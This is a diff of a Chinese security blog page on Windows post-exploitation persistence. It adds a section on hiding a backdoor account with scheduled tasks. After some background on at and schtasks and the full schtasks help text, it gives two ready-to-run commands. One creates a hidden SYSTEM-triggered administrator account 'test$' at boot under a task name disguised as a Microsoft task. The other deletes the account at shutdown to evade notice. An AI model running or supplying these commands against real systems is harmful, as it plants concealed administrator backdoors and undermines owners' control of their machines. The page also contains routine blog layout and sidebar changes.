@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">3.9k</span>阅读时长: <span class="post-count reading-time">16 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">5.5k</span>阅读时长: <span class="post-count reading-time">22 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -507,6 +507,131 @@ height:50vh;
 <h2 id="防护方法"><a href="#防护方法" class="headerlink" title="防护方法"></a>防护方法</h2><blockquote>
 <p>针对隐藏帐户的利用，查看注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\即可<br>当然，默认管理员权限无法查看，需要分配权限或是提升至Sytem权限<br>隐藏帐户的登录记录，可通过查看日志获取</p>
 </blockquote>
+<h1 id="Win7下通过事件触发隐藏账户"><a href="#Win7下通过事件触发隐藏账户" class="headerlink" title="Win7下通过事件触发隐藏账户"></a>Win7下通过事件触发隐藏账户</h1><blockquote>
+<p>利用计划任务触发恶意代码在win xp时代就已有应用。在winxp时代，计划任务利用“at”命令实现对某个已植入木马的定时启动。但是，这种方法并不常用，主要原因有下:<br>(1) 在winxp中，计划任务通常为很少或空(即没有)，因此新增项在计划任务列表中很明显。<br>(2) winxp下的计划任务执行的多为已经植入的木马，或者已有的命令行(如net user /add新加用户之类)，没有远程下载等功能;<br>(3) winxp下的计划任务常用时间触发，其命令行为:at time process 格式，触发方式比较单一。<br>到了win 7之后，at命令功能逐步被schtasks命令代替(虽然win7中还保留了at命令行)，到了win 10以后，at命令行彻底被schtasks代替。<br>schtasks代替at主要体现在其功能更加丰富，优点如下:<br>(1) 触发机制多样化:如通过时间、时长、日志事件)等<br>(2) 默认的计划任务很多(如下图本机win10)，例如windows更新、Adobe等 软件的更新等 ，这使得如果木马可以很好将自身的计划任务淹没在其中。</p>
+</blockquote>
+<blockquote>
+<p>如果我们将创建隐藏账户设置为开机为自动执行，删除账户设置为关机自动执行，那么用户在登陆的时候就看不到我们设置的隐藏账户了。</p>
+</blockquote>
+<p><strong>Win7设置计划任务</strong></p>
+<blockquote>
+<p>控制面板-计划任务可以打开计划任务窗口，看到目前的计划任务项。<br>命令行使用taskschd.msc打开该窗口。<br>命令行下也可使用schtasks 命令对计划任务进行添加查看等操作。</p>
+</blockquote>
+<p><strong>schtasks命令详解</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCHTASKS /Create [/S system [/U username [/P [password]]]] [/RU username [/RP password]] /SC schedule [/MO modifier] [/D day] [/M months] [/I idletime] /TN taskname /TR taskrun [/ST starttime][/RI interval] [ &#123;/ET endtime | /DU duration&#125; [/K] [/XML xmlfile] [/V1]] [/SD startdate] [/ED enddate] [/IT | /NP] [/Z] [/F]</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>描述:<br>允许管理员在本地或远程系统上创建计划任务。</p>
+</blockquote>
+<blockquote>
+<p>参数列表:<br>    /S   system        指定要连接到的远程系统。如果省略这个系统参数，默认是本地系统。</p>
+</blockquote>
+<pre><code>/U   username      指定应在其中执行 SchTasks.exe 的用户上下文。
+
+/P   [password]    指定给定用户上下文的密码。如果省略则提示输入。
+
+/RU  username      指定任务在其下运行的“运行方式”用户帐户(用户上下文)。
+                   对于系统帐户，有效值是 &quot;&quot;、&quot;NT AUTHORITY\SYSTEM&quot; 或&quot;SYSTEM&quot;。
+                   对于 v2 任务，&quot;NT AUTHORITY\LOCALSERVICE&quot;和
+                   &quot;NT AUTHORITY\NETWORKSERVICE&quot;以及常见的 SID。对这三个也都可用。
+
+/RP  [password]    指定“运行方式”用户的密码。要提示输入密码，值必须是 &quot;*&quot; 或无。
+                   系统帐户会忽略该密码。必须和 /RU 或 /XML 开关一起使用。
+
+/RU/XML  /SC  schedule     指定计划频率。
+                   有效计划任务:  MINUTE、 HOURLY、DAILY、WEEKLY、
+                   MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, ONEVENT.
+
+/MO   modifier     改进计划类型以允许更好地控制计划重复
+                   周期。有效值列于下面“修改者”部分中。
+
+/D    days         指定该周内运行任务的日期。有效值:
+                   MON、TUE、WED、THU、FRI、SAT、SUN
+                   和对 MONTHLY 计划的 1 - 31
+                   (某月中的日期)。通配符“*”指定所有日期。
+
+/M    months       指定一年内的某月。默认是该月的第一天。
+                   有效值: JAN、FEB、MAR、APR、MAY、JUN、
+                   JUL、 AUG、SEP、OCT、NOV  和 DEC。通配符
+                   “*” 指定所有的月。
+
+/I    idletime     指定运行一个已计划的 ONIDLE 任务之前
+                   要等待的空闲时间。
+                   有效值范围: 1 到 999 分钟。
+
+/TN   taskname     指定唯一识别这个计划任务的名称。
+
+/TR   taskrun      指定在这个计划时间运行的程序的路径
+                   和文件名。
+                   例如: C:\windows\system32\calc.exe
+
+/ST   starttime    指定运行任务的开始时间。
+                   时间格式为 HH:mm (24 小时时间)，例如 14:30 表示
+                   2:30 PM。如果未指定 /ST，则默认值为
+                   当前时间。/SC ONCE 必需有此选项。
+
+/RI   interval     用分钟指定重复间隔。这不适用于
+                   计划类型: MINUTE、HOURLY、
+                   ONSTART, ONLOGON, ONIDLE, ONEVENT.
+                   有效范围: 1 - 599940 分钟。
+                   如果已指定 /ET 或 /DU，则其默认值为
+                   10 分钟。
+
+/ET   endtime      指定运行任务的结束时间。
+                   时间格式为 HH:mm (24 小时时间)，例如，14:50 表示 2:50 PM。
+                   这不适用于计划类型: ONSTART、
+                   ONLOGON, ONIDLE, ONEVENT.
+
+/DU   duration     指定运行任务的持续时间。
+                   时间格式为 HH:mm。这不适用于 /ET 和
+                   计划类型: ONSTART, ONLOGON, ONIDLE, ONEVENT.
+                   对于 /V1 任务，如果已指定 /RI，则持续时间默认值为
+                   1 小时。
+
+/K                 在结束时间或持续时间终止任务。
+                   这不适用于计划类型: ONSTART、
+                   ONLOGON, ONIDLE, ONEVENT.
+                   必须指定 /ET 或 /DU。
+
+/SD   startdate    指定运行任务的第一个日期。
+                   格式为 yyyy/mm/dd。默认值为
+                   当前日期。这不适用于计划类型: ONCE、
+                   ONSTART, ONLOGON, ONIDLE, ONEVENT.
+
+/ED   enddate      指定此任务运行的最后一天的日期。
+                   格式是 yyyy/mm/dd。这不适用于计划类型:
+                    ONCE、ONSTART、ONLOGON、ONIDLE。
+
+/EC   ChannelName  为 OnEvent 触发器指定事件通道。
+
+/IT                仅有在 /RU 用户当前已登录且
+                   作业正在运行时才可以交互式运行任务。
+                   此任务只有在用户已登录的情况下才运行。
+
+/NP                不储存任何密码。任务以给定用户的身份
+                   非交互的方式运行。只有本地资源可用。
+
+/Z                 标记在最终运行完任务后删除任务。
+
+/XML  xmlfile      从文件的指定任务 XML 中创建任务。
+                   可以组合使用 /RU 和 /RP 开关，或者在任务 XML 已包含
+                   主体时单独使用 /RP。
+
+/V1                创建 Vista 以前的平台可以看见的任务。
+                   不兼容 /XML。
+
+/F                 如果指定的任务已经存在，则强制创建
+                   任务并抑制警告。
+
+/RL   level        为作业设置运行级别。有效值为
+                   LIMITED 和 HIGHEST。默认值为 LIMITED。
+
+/DELAY delaytime   指定触发触发器后延迟任务运行的
+                   等待时间。时间格式为
+                   mmmm:ss。此选项仅对计划类型
+                   ONSTART, ONLOGON, ONEVENT.
+
+/?                 显示帮助消息。
+</code></pre><p><strong>设置开机创建账户</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn &quot;Microsoft\Windows\LocalEventLog&quot; /tr &quot;\&quot;cmd.exe\&quot; /k net user test$ 123456 /add /y /active:yes &gt;&gt; nul &amp; net localgroup administrators test$ /add &gt; nul &amp; net user test$ /comment:\&quot;Built-in account for Backdooring your network suckers\&quot; &gt; nul &amp; exit&quot; /f /ru system /sc onstart</span><br></pre></td></tr></table></figure></p>
+<p><strong>关机删除账户</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn &quot;Microsoft\Windows\LocalEventLog&quot; /tr &quot;\&quot;cmd.exe\&quot; /k net user test$ /del &gt; nul &amp; exit&quot; /f /ru system /sc onevent /ec System /mo &quot;*[System[EventID=1074]]&quot;</span><br></pre></td></tr></table></figure></p>
 <p><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt></p>
 <p><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt></p>
 <p><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt></p>
@@ -518,7 +643,7 @@ height:50vh;
             <p>原文作者：<a href="http://yoursite.com">HackPluto</a>
             </p><p>原文链接：<a href="http://yoursite.com/2019/09/01/windows后渗透维权/">http://yoursite.com/2019/09/01/windows后渗透维权/</a>
             </p><p>发表日期：<a href="http://yoursite.com/2019/09/01/windows后渗透维权/">September 1st 2019, 12:21:00 am</a>
-            </p><p>更新日期：<a href="http://yoursite.com/2019/09/01/windows后渗透维权/">September 4th 2019, 12:16:49 am</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/09/01/windows后渗透维权/">September 7th 2019, 10:21:56 am</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -645,7 +770,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#背景"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#win7下通过修改注册表建立隐藏账户"><span class="toc-number">2.</span> <span class="toc-text">win7下通过修改注册表建立隐藏账户</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#功能实现"><span class="toc-number">2.1.</span> <span class="toc-text">功能实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-number">2.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#脚本实现"><span class="toc-number">2.3.</span> <span class="toc-text">脚本实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防护方法"><span class="toc-number">2.4.</span> <span class="toc-text">防护方法</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#背景"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#win7下通过修改注册表建立隐藏账户"><span class="toc-number">2.</span> <span class="toc-text">win7下通过修改注册表建立隐藏账户</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#功能实现"><span class="toc-number">2.1.</span> <span class="toc-text">功能实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-number">2.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#脚本实现"><span class="toc-number">2.3.</span> <span class="toc-text">脚本实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防护方法"><span class="toc-number">2.4.</span> <span class="toc-text">防护方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Win7下通过事件触发隐藏账户"><span class="toc-number">3.</span> <span class="toc-text">Win7下通过事件触发隐藏账户</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -658,28 +783,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -1329,12 +1432,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/python下多核/">python下多核，单核CPU对于并行，并发执行效率的对比</a>
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/sqli-labs/">sqli-labs 通关详解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/sqli-labs/">sqli-labs 通关详解</a>
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/python下多核/">python下多核，单核CPU对于并行，并发执行效率的对比</a>
         </li>
     
     
@@ -1349,43 +1452,43 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="逆向,恶意代码"><span class="iconfont-archer">&#xe606;</span>逆向,恶意代码</span>
     
+        <span class="sidebar-tag-name" data-tags="逆向,CTF"><span class="iconfont-archer">&#xe606;</span>逆向,CTF</span>
+    
         <span class="sidebar-tag-name" data-tags="ACM,数论"><span class="iconfont-archer">&#xe606;</span>ACM,数论</span>
     
         <span class="sidebar-tag-name" data-tags="ctf,web,编码"><span class="iconfont-archer">&#xe606;</span>ctf,web,编码</span>
-    
-        <span class="sidebar-tag-name" data-tags="逆向,CTF"><span class="iconfont-archer">&#xe606;</span>逆向,CTF</span>
     
         <span class="sidebar-tag-name" data-tags="Linux,LAMP"><span class="iconfont-archer">&#xe606;</span>Linux,LAMP</span>
     
         <span class="sidebar-tag-name" data-tags="防火墙,iptables"><span class="iconfont-archer">&#xe606;</span>防火墙,iptables</span>
     
-        <span class="sidebar-tag-name" data-tags="SSH,端口转发"><span class="iconfont-archer">&#xe606;</span>SSH,端口转发</span>
-    
         <span class="sidebar-tag-name" data-tags="IDA,OllyDB"><span class="iconfont-archer">&#xe606;</span>IDA,OllyDB</span>
+    
+        <span class="sidebar-tag-name" data-tags="SSH,端口转发"><span class="iconfont-archer">&#xe606;</span>SSH,端口转发</span>
     
         <span class="sidebar-tag-name" data-tags="IIS"><span class="iconfont-archer">&#xe606;</span>IIS</span>
     
-        <span class="sidebar-tag-name" data-tags="信息收集,社会工程学"><span class="iconfont-archer">&#xe606;</span>信息收集,社会工程学</span>
-    
         <span class="sidebar-tag-name" data-tags="windows,域控,内网渗透"><span class="iconfont-archer">&#xe606;</span>windows,域控,内网渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="信息收集,社会工程学"><span class="iconfont-archer">&#xe606;</span>信息收集,社会工程学</span>
     
         <span class="sidebar-tag-name" data-tags="Scrapy,python"><span class="iconfont-archer">&#xe606;</span>Scrapy,python</span>
     
-        <span class="sidebar-tag-name" data-tags="域控制器"><span class="iconfont-archer">&#xe606;</span>域控制器</span>
+        <span class="sidebar-tag-name" data-tags="动态规划(DP)"><span class="iconfont-archer">&#xe606;</span>动态规划(DP)</span>
     
         <span class="sidebar-tag-name" data-tags="PWN,BROP,栈溢出"><span class="iconfont-archer">&#xe606;</span>PWN,BROP,栈溢出</span>
     
-        <span class="sidebar-tag-name" data-tags="应用层,计算机网络"><span class="iconfont-archer">&#xe606;</span>应用层,计算机网络</span>
+        <span class="sidebar-tag-name" data-tags="域控制器"><span class="iconfont-archer">&#xe606;</span>域控制器</span>
     
         <span class="sidebar-tag-name" data-tags="XCTF,逆向"><span class="iconfont-archer">&#xe606;</span>XCTF,逆向</span>
     
+        <span class="sidebar-tag-name" data-tags="应用层,计算机网络"><span class="iconfont-archer">&#xe606;</span>应用层,计算机网络</span>
+    
         <span class="sidebar-tag-name" data-tags="pwn,格式化字符串"><span class="iconfont-archer">&#xe606;</span>pwn,格式化字符串</span>
     
-        <span class="sidebar-tag-name" data-tags="动态规划(DP)"><span class="iconfont-archer">&#xe606;</span>动态规划(DP)</span>
+        <span class="sidebar-tag-name" data-tags="工具,python,Netcat"><span class="iconfont-archer">&#xe606;</span>工具,python,Netcat</span>
     
         <span class="sidebar-tag-name" data-tags="工具,python,proxy"><span class="iconfont-archer">&#xe606;</span>工具,python,proxy</span>
-    
-        <span class="sidebar-tag-name" data-tags="工具,python,Netcat"><span class="iconfont-archer">&#xe606;</span>工具,python,Netcat</span>
     
         <span class="sidebar-tag-name" data-tags="Linux,GOT,PLT"><span class="iconfont-archer">&#xe606;</span>Linux,GOT,PLT</span>
     
@@ -1403,11 +1506,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="ctf,web,sql注入"><span class="iconfont-archer">&#xe606;</span>ctf,web,sql注入</span>
     
-        <span class="sidebar-tag-name" data-tags="windows,影子账户"><span class="iconfont-archer">&#xe606;</span>windows,影子账户</span>
-    
         <span class="sidebar-tag-name" data-tags="计算机网络,网络层"><span class="iconfont-archer">&#xe606;</span>计算机网络,网络层</span>
     
         <span class="sidebar-tag-name" data-tags="PWN,栈溢出"><span class="iconfont-archer">&#xe606;</span>PWN,栈溢出</span>
+    
+        <span class="sidebar-tag-name" data-tags="windows,影子账户"><span class="iconfont-archer">&#xe606;</span>windows,影子账户</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
